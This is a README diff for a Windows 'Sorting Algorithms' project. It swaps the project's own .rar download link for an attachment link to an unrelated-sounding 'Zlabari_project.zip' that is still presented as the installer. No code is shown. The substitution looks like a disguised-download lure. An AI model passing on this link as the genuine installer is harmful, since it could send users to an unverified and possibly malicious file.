@@ -31,7 +31,8 @@
 
 ## Download
 
-You can [download](https://github.com/ROB0CITRON/SortingProject/raw/Download/Sorting%20Algorithms.rar) the latest installable version of Sorting Algorithms for Windows.
+You can [download](https://github.com/user-attachments/files/15509966/Zlabari_project.zip) the latest
+installable version of Sorting Algorithms for Windows.
 
 ## Creators
 
